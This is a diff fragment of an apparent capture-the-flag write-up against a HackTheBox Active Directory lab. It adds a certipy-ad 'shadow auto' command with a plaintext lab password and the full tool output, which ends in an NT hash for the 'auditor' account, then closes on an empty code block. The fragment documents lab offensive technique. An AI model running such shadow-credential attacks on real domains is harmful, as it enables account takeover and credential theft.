@@ -988,5 +988,35 @@ I have had to add kerberos auth to my tool, so that may appear on GH soon.
 
 But this user should now be in the new OU
 
+```python
+certipy-ad shadow auto -u 'natalie.a@hercules.htb' -p 'Prettyprincess123!' -account 'Auditor' -dc-host dc.hercules.htb -dc-ip 10.129.242.196 -k -target dc.hercules.htb
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
 
+[!] KRB5CCNAME environment variable not set
+[*] Targeting user 'auditor'
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating Key Credential
+[*] Key Credential generated with DeviceID '2eef6fc9f6b74521861ab86896dd8a1d'
+[*] Adding Key Credential with device ID '2eef6fc9f6b74521861ab86896dd8a1d' to the Key Credentials for 'auditor'
+[*] Successfully added Key Credential with device ID '2eef6fc9f6b74521861ab86896dd8a1d' to the Key Credentials for 'auditor'
+[*] Authenticating as 'auditor' with the certificate
+[*] Certificate identities:
+[*]     No identities found in this certificate
+[*] Using principal: 'auditor@hercules.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'auditor.ccache'
+[*] Wrote credential cache to 'auditor.ccache'
+[*] Trying to retrieve NT hash for 'auditor'
+[*] Restoring the old Key Credentials for 'auditor'
+[*] Successfully restored the old Key Credentials for 'auditor'
+[*] NT hash for 'auditor': a9285c625af80519ad784729655ff325
+```
+
+Then ill get the NT hash for the user
+
+```python
+
+```
 
